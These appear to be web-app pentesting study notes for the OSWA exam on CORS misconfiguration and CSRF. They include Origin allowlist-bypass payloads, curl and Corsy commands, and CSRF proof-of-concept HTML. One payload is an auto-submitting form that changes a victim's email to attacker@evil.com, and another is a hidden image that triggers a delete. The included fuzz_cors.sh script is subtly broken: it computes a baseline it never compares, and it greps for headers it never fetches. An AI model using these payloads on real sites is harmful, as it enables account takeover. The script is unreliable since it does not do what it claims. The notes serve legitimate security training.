---
category: OSWA Web App Pentesting
order: 9
summary: Origin-allowlist bypass payloads, CORS misconfig testing methodology (Burp + curl + Corsy), and CSRF PoC templates.
---
# CORS & CSRF

## Testing trap — read this first

Don't test with `OPTIONS` only. Preflight responses are often generic/empty regardless of `Origin`. The real allow/deny logic usually lives in the actual method handler. Always send the real method (GET/POST) with a valid session cookie + your test `Origin`.

## Methodology (fast)

1. Send a request with `Origin: https://evil.com` on the real method (not just OPTIONS), cookies attached.
2. Check the response: is `Access-Control-Allow-Origin` reflecting your value? Is `Access-Control-Allow-Credentials: true` present?
3. If yes to both → confirmed. Build a `fetch()` PoC.
4. If no → try the bypass Origins below; diff each response against a baseline (deliberately invalid Origin) to catch subtle validation logic.

## Origin bypass payloads (allowlist logic failures)

| Origin sent | Bypasses when validation uses... |
|---|---|
| `null` | Accepts `null` (from sandboxed iframe / `data:` redirect) |
| `https://trusted.com.evil.com` | `startswith("https://trusted.com")` |
| `https://evil-trusted.com` | `endswith("trusted.com")` without a leading dot check |
| `https://trustedXcom` | Unescaped `.` in regex (`.` matches any char) |
| `https://trusted.com%60.evil.com` | Backtick/parsing quirks in some frameworks |
| `http://trusted.com` | Scheme not checked (https downgraded to http) |
| `https://trusted.com:1337` | Port not checked |
| `https://sub.trusted.com` | Wildcard subdomain trust + attacker controls a subdomain (via takeover/upload) |

## Burp usage

- **Repeater**: send request, edit `Origin` header manually, resend, inspect response headers.
- **Intruder**: mark `Origin` value as payload position → payload list = table above → Grep - Match on `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials` to spot hits fast across all attempts.

## curl one-liners

```bash
# Real GET/POST with Origin + session cookie (not OPTIONS!)
curl -i -X GET "https://target/api/private" \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=<valid_cookie>"

# Check if reflected + credentials allowed
curl -si "https://target/api/private" -H "Origin: https://evil.com" -H "Cookie: session=..." \
  | grep -i "access-control"
```

## Tool: Corsy (automated CORS misconfig scanner)

Automates all the bypass categories above (null origin, pre/post-domain, unescaped dot, wildcard, reflection, https→http downgrade).

```bash
git clone https://github.com/s0md3v/Corsy.git
cd Corsy
pip3 install -r requirements.txt
python3 corsy.py -u https://target/api/private --headers "Cookie: session=<valid_cookie>"
```

**OSWA exam note:** Corsy (and dirsearch) are not on OffSec's explicitly-named allowed-tools list for the OSWA exam (only Nmap, Nikto, Burp, DirBuster, SQLMap, Tplmap, msfvenom, ysoserial are named). Confirm with `challenges@offsec.com` before relying on it in-exam — safe to use for practice/labs.

## fuzz_cors.sh (manual fallback if Corsy isn't allowed)

Diffs each candidate Origin's response against a baseline (obviously-invalid Origin) — flags anything that differs, i.e. anything actually being validated/reflected differently.

```bash
#!/bin/bash
# usage: ./fuzz_cors.sh https://target/api/endpoint "session=<cookie>"
URL="$1"
COOKIE="$2"
ORIGINS=("null" "https://evil.com" "https://target.com.evil.com" "http://target.com" "https://sub.target.com")

baseline=$(curl -s -o /dev/null -w "%{http_code}" -H "Origin: https://invalid-baseline-xyz.com" -H "Cookie: $COOKIE" "$URL")

for o in "${ORIGINS[@]}"; do
  resp=$(curl -s -H "Origin: $o" -H "Cookie: $COOKIE" "$URL")
  acao=$(echo "$resp" | grep -io "access-control-allow-origin:.*" )
  echo "[$o] => $acao"
done
```

## CSRF quick payloads

```html
<!-- GET-based (delivers via <img>, no click needed) -->
<img src="https://target/user/delete?id=123" style="display:none">

<!-- POST-based (auto-submit) -->
<body onload="document.forms[0].submit()">
<form action="https://target/user/changeEmail" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
```

Check cookie `SameSite` first (DevTools → Application → Cookies): `Strict`/`Lax` blocks most of the above; `None` (or unset on old browsers) doesn't.

## Reference links

- Corsy — https://github.com/s0md3v/Corsy
- PortSwigger — CORS, CSRF Web Security Academy labs
